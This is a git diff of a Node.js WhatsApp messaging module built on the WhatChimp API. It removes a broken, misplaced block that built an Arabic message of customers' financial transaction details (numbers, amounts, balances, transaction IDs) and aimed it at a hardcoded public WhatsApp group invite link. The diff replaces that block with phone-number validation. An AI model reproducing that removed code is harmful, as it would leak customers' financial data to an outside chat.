@@ -1,6 +1,7 @@
 'use strict';
 
 const axios = require('axios');
+const SYSTEM_TIME_ZONE = process.env.SYSTEM_TIME_ZONE || 'Africa/Tripoli';
 
 const DEFAULT_WHATCHIMP_API_BASE_URL = 'https://app.whatchimp.com/api/v1/whatsapp';
 const OTP_DEFAULT_VARIABLE_ORDER = ['otp', 'expiresMinutes', 'accountName', 'accountType'];
@@ -166,17 +167,10 @@ const sendWhatChimpTemplate = async ({ phone, templateName, languageCode, variab
 
     let phoneNumber;
     try {
-        const groupTarget = process.env.WHATSAPP_GROUP_JID || 'https://chat.whatsapp.com/BP5E7X25o5zHVvs5DmTVrR?s=cl&p=a&ilr=4';
-        
-        const message = `[ التفاصيل المالية والتشغيلية للعملية ]
-- رقم الموبايل   : ${tx.vodafoneNumber || tx.accountNumber || '---'}
-- القيمة         : ${tx.amount} EGP
-- الرصيد قبل     : ${apiResult.balance_before !== undefined ? apiResult.balance_before : '---'} EGP
-- الرصيد بعد     : ${apiResult.balance_after !== undefined ? apiResult.balance_after : '---'} EGP
-- الحالة         : ${apiResult.status || 'عمليه ناجحه'}
-- رقم العملية    : ${apiResult.external_transaction_id || '---'}
-- وقت العملية    : ${apiResult.transaction_time || new Date().toLocaleString('ar-EG')}
-- الرقم المرجعي  : ${apiResult.sender_number || '---'}`;
+        phoneNumber = normalizeWhatsAppPhone(phone);
+    } catch (error) {
+        return { success: false, provider: 'whatchimp', code: error.code || 'WHATSAPP_PHONE_INVALID', message: error.message };
+    }
 
     const fields = {
         apiToken: config.apiToken,
